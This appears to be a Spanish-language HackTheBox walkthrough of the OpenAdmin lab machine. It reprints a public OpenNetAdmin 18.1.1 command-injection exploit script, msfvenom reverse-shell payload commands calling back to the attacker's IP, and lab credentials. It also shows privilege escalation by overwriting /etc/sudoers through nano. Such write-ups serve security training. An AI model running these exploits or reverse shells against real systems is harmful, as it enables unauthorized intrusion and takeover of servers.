---
title: HTB-OPENADMIN
author: Christian Gutierrez
date: 2020-11-24 14:10:00 -0500
categories: [HackTheBox, Easy]
tags: [HTB, pspy, lpf, nano]
image: /assets/htb/04_openAdmin/portada.PNG
---
## Decripción del entorno
### <span style="color:green">Atacante</span>

| OS          | Kali Linux          |
| IP          | 10.10.15.125        |

### <span style="color:green">Maquina Objetivo</span>

| OS          | Windows             |
| IP          | 10.10.10.171        |
| Dificultad  | 4.4/10 / **Easy** |
| URL         | [**OpenAdmin**](https://www.hackthebox.eu/home/machines/profile/222)    |

## Enumeración
Se realiza la enumeración habitual para el reconocimiento e identificación de los puertos abiertos en el sistema: 
```console
$ nmap -sS -sV -sC -oA nmap_openadmin 10.10.10.171
```
![Escaneo con Nmap](/assets/htb/04_openAdmin/01_nmap_openadmin.png)
_Resultado escaneo con nmap_

Enfocandonos en el peurto 80 e intentando descubrir directorios con la herramienta WFuzz, se obtienen los siguientes resultados: 
```console
$ wfuzz -w /usr/wordlist/dirbuster/directory-list-2.3-medium.txt --hc 404 http://10.10.10.171/FUZZ/
```
- /music/
- /artwork/
- /ona/

Parece que cada directorio tiene una plantilla diferente:
![Directorios](/assets/htb/04_openAdmin/02_directorios_puerto_80.png)
_Directorios puerto 80_

Sin embargo, en el directorio `/ona/` se encuentra un **panel de administración** del servicio `OpenNetAdmin` en su versión `18.1.1`, el cual es un administrador masivo de red que conecta y monitorea bases de datos, redes y subredes: 

![Panel Ona](/assets/htb/04_openAdmin/03_panel_ona.png)
_Panel administrativo OpenNetAdmin v18.1.1_

Este parece ser el activo más importante, por lo cual se realiza una búsqueda e identificación de los exploit's públicos que puedan afectarlo: 
```console
$ searchsploit OpenNetAdmin
```
![Searchsploit](/assets/htb/04_openAdmin/04_searchsploit_opennetadmin.png)
_Exploit's publicos OpenNetAdmin_

Se obtienen **3** resultados de diferentes exploit que se pueden utilizar para afectar la plataforma dado que coinciden con la **versión 18.1.1** desplegada e identificada en el servidor victima:
- [**OpenNetAdmin 18.1.1 - Remote Code Execution **](https://www.exploit-db.com/exploits/47691)

```bash
# Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```

El exploit es simple, aunque el panel administrativo automáticamente nos posibilita ciertas funciones como usuario invitado (**guest**) y requiere autenticación para el usuario administrativo, este software tiene una funcionalidad al estilo de Inyección de comandos, en el que realiza un `ping` recibiendo el comando como parámetro desde el cliente y lo ejecuta directamente, así que podemos aprovecharnos de esto y agremás más comandos utilizando  `;`.  Recreamos el comportamiento y validamos de forma manual la vulnerabilidad:

![Exploit Manual](/assets/htb/04_openAdmin/05_exploit_manual.png)
_Recreando el exploit manualmente_

Como resultado al comando `whoami` podemos ver en la respuesta:

![Resultado Exploit](/assets/htb/04_openAdmin/06_resultado_exploit.png)
_Resultado del exploit-whoami_

De esta manera se determina que tenemos un **RCE** con privilegios de usuario `www-data`, por lo que aprovecharemos algunas herramientas internas para subir o ejecutar una Shell más comoda con un meterpreter de metasploit: 

```console
$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.15.125 LPORT=4646 -f raw > d14.php
```
![Msfvenom payload php](/assets/htb/04_openAdmin/07_msfvenom_php.png)
_Generando Payload con msfvenom en php_

Dejamos a la escucha el multi handler de metasploit y recibimos la conexión: 
```console
$ msfconsole
> use multi/handler
> set payload php/meterpreter_reverse_tct
> set LHOST 10.10.15.125
> set LPORT 4646
```

La ejecución de esta Shell se hace de forma remota, debido a que el usuario `www-data` tiene acceso de escritura sobre el directorio principal `/opt/ona/www` el cual corresponde al directorio raíz del **OpenNetAdmin**, de esta forma activamos nuestra shell desde el browser: 
- http://openadmin.htb/ona/d14.php

![Meterpreter](/assets/htb/04_openAdmin/08_meterpreter_handler.png)
_Recibiendo el Meterpreter con Metasploit_

Una vez tenemos acceso al servidor, se procede a realizar una enumeración y recolección de la información interna. Considerando que este acceso inicial **NO** nos permite la lectura de la flag `user.txt`, es necesrio escalar privilegios. 

## Elevación de Privilegios

Bajo el contexto de un sistema/aplicativo robusto para el manejo de redes y subredes, lo primero que intentamos identificar son las cadenas de conexión de todos los aplicativos inscritos en `ona`, con el objetivo de recolectar las contraseñas y poder vulnerar otros servicios. 

Identificamos el archivo de configuración principal del software `OpenNetAdmin`: 
```console
$ cat /var/www/ona/local/config/database_settings.inc.php
```

![Database Settings](/assets/htb/04_openAdmin/09_dabase_settings.png)
_Configuración de conexión a base de datos_

De este archivo recolectamos las credenciales de la base de datos: 
- ona_sys:**n1nj4W4rri0R!**

Sin embargo, nos percatamos que dicha contraseña funciona al conectarnos por **SSH** con el usuario **Jimmy**: 

- jimmy: **n1nj4W4rri0R!**

El usuario **Jimmy** no cuenta con los privilegios para poder capturar alguna de las flags, así que seguimos con la recopilación de información. Nos conectamos al `Mysql` con las credenciales y vemos si existen otros usuarios

![DB Mysql](/assets/htb/04_openAdmin/10_db_mysql.png)
_Base de datos MySQL_

Identificamos la tabla users y dumpeamos los registros referentes a contraseñas o hashes, pero no hubo información relevante.  

> Nota: 
> Son validaciones que se deben considerar así no funcionen ;) 

Seguimos recolectando información y descubrimos un directorio interesante:
- `/var/www/internal/`

El cual tiene unos archivos **PHP** que, de accederlos de la forma correcta permiten la lectura del archivo `id_rsa` del usuario `Joanna`, no obstante, no encontramos dichos archivos de forma pública en el servidor para consumirlos por el browser, así que entramos a indagar sobre qué otros aplicativos internos están montados y en qué puertos: 

- index.php: 
```php
jimmy@openadmin:/var/www/internal$ cat index.php
<?php
   ob_start();
   session_start();
?>

<?
   // error_reporting(E_ALL);
   // ini_set("display_errors", 1);
?>

<html lang = "en">

   <head>
      <title>Tutorialspoint.com</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">

      <style>
         body {
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #ADABAB;
         }

         .form-signin {
            max-width: 330px;
            padding: 15px;
            margin: 0 auto;
            color: #017572;
         }

         .form-signin .form-signin-heading,
         .form-signin .checkbox {
            margin-bottom: 10px;
         }

         .form-signin .checkbox {
            font-weight: normal;
         }

         .form-signin .form-control {
            position: relative;
            height: auto;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            padding: 10px;
            font-size: 16px;
         }

         .form-signin .form-control:focus {
            z-index: 2;
         }

         .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
            border-color:#017572;
         }

         .form-signin input[type="password"] {
            margin-bottom: 10px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-color:#017572;
         }

         h2{
            text-align: center;
            color: #017572;
         }
      </style>

   </head>
   <body>

      <h2>Enter Username and Password</h2>
      <div class = "container form-signin">
        <h2 class="featurette-heading">Login Restricted.<span class="text-muted"></span></h2>
          <?php
            $msg = '';

            if (isset($_POST['login']) && !empty($_POST['username']) && !empty($_POST['password'])) {
              if ($_POST['username'] == 'jimmy' && hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') {
                  $_SESSION['username'] = 'jimmy';
                  header("Location: /main.php");
              } else {
                  $msg = 'Wrong username or password.';
              }
            }
         ?>
      </div> <!-- /container -->

      <div class = "container">

         <form class = "form-signin" role = "form"
            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']);
            ?>" method = "post">
            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
            <input type = "text" class = "form-control"
               name = "username"
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit"
               name = "login">Login</button>
         </form>

      </div>

   </body>
</html>
```

![Portal Interno](/assets/htb/04_openAdmin/13_portal_interno.png)
_Datos de despliegue del portal interno_

De los archivos de configuración, vemos que el **sitio internal** aunque tiene asociado un subdominio, solo es accesible localmente en la siguiente ruta y puerto: 
- http://127.0.0.1:52846

Realizamos un **Local Port Forwarding** mediante **SSH**, por lo que creamos un tunel del **puerto 52846** hacia nuestra maquina mediante **SSH** y así podemos accederlo: 

![Local Port Forwarding](/assets/htb/04_openAdmin/14_local_port_fordwarding.png)
_Local port forwarding mediante ssh, al puerto 52846_

Al acceder a nuestro **puerto 8080** localmente, estaremos realmente accediendo al **puerto 52846** de la maquina víctima, de esta manera, interactuando con el aplicativo **internal**: 

![Portal Interno](/assets/htb/04_openAdmin/15_portal_interno.png)
_Acceso al portal interno mediante el tunel ssh_

- User: Jimmy
- Password: Reveled

Una vez pasamos la restricción de login, obtenemos el **certificado RSA** del usuario **Joanna**, sin embargo este se encuentra cifrado por una contraseña, así que debemos descubrir o buscar otro método de impersonar el usuario: 

![Certificado RSA](/assets/htb/04_openAdmin/16_llave_RSA_user_johana.png)
_Certificado RSA del usuario Joanna_

En este punto se intentan diferentes forma de ataque el certificado, pero nos enfocamos en que se tiene acceso de escritura a la ruta del aplicativo **internal** que esta configurado para tener los permisos del usuario **Joanna**, así que colocamos allí nuestra Shell **php** y la accedemos valiéndonos del **Local Port Forwarding**: 

![Meterpreter Joanna](/assets/htb/04_openAdmin/17_meterpreter_joanna.png)
_Recibimos una shell reversa al inyectarla directamente en uno de los archivos con perisos de joanna_

Vemos que funciona, ya que el usuario **Jimmy** tiene permisos de escritura en `/var/www/internal` así que recibimos y capturamos la conexión pero ahora con los permisos del usuario **Joanna**, esto  permite la captura de la flag `user.txt`.

> Nota:
> El siguiente paso es escalar privilegios hasta root. Para poder tener una mejor interacción con la Shell lo optimo es usar SSH, así que agregamos nuestra llave pública a los `authorized_keys` del usuario **Joanna**.

## Elevación de Privilegios

En este punto, es muy frecuente intentar ver todos los procesos y comandos que se están inyectando en tiempo real en la máquina, para así identificar `Jobs` o `crontabs` de usuarios más privilegiados. Para lograrlo, utilizamos la herramiente PSPY:

![PSPY](/assets/htb/04_openAdmin/18_pspy_linux.png)
_Uso de la herramienta PSPY_

De los resultados se logra identificar el comando `sudo /bin/nano /opt/priv` el cual esta ejecutando el usuario **root** con `UID=0`:

![Sudoers](/assets/htb/04_openAdmin/19_sudoers.png)
_Resultado de los sudoers_

No obstante, con el comando `sudo -l` podemos ver los **sudoers** establecidos en la maquina para el usuario **Joanna**, en este caso nos indica que podemos ejecutar el siguiente comando como **root**:

```console
$ sudo -u root /bin/nano /opt/priv
```

Algo interesante de esto es el hecho de que existen varias formas de poder obtener una Shell ejecutando `nano`, pero hay algo aún más intuitivo que vamos a utilizar. En este caso, podemos abrir el archivo `/opt/priv` como root, pero al momento de realizar cambios `CTRL + O` la herramienta `nano` nos permite cambiar el nombre y la ruta al archivo, por tanto, al tener los privilegios de **root** significa que también podemos sobrescribir archivos importantes del sistema a nuestro beneficio:

- `/etc/sudoers`

![Sobreescritura Sudoers](/assets/htb/04_openAdmin/20_sobrescritura_sudoers.png)
_Sobreescribiendo los sudoers_

```
root ALL=(ALL:ALL) ALL
%sudo ALL=(ALL:ALL) ALL

joanna ALL=(root) NOPASSWD: ALL
```

¿Qué sucedería si cambiamos el contenido del `/etc/sudoers` a esto? Efectivamente, al sobrescribirlo, le estamos indicando al sistema que el usuario **Joanna** podrá ejecutar cualquier programa como **root** sin necesidad de requerir PASSWORD, de esta manera elevamos privilegios.

![Acceso como Root](/assets/htb/04_openAdmin/21_root2.png)
_Acceso como root_

Bytez ;) 

## Referencias
1. Monitor de procesos en Linux
    - <https://github.com/DominicBreuker/pspy>
2. Lista de binarios UNIX que se pueden aprovechar para elevar privilegios por mala configuración. 
    - <https://gtfobins.github.io/gtfobins/nano/>
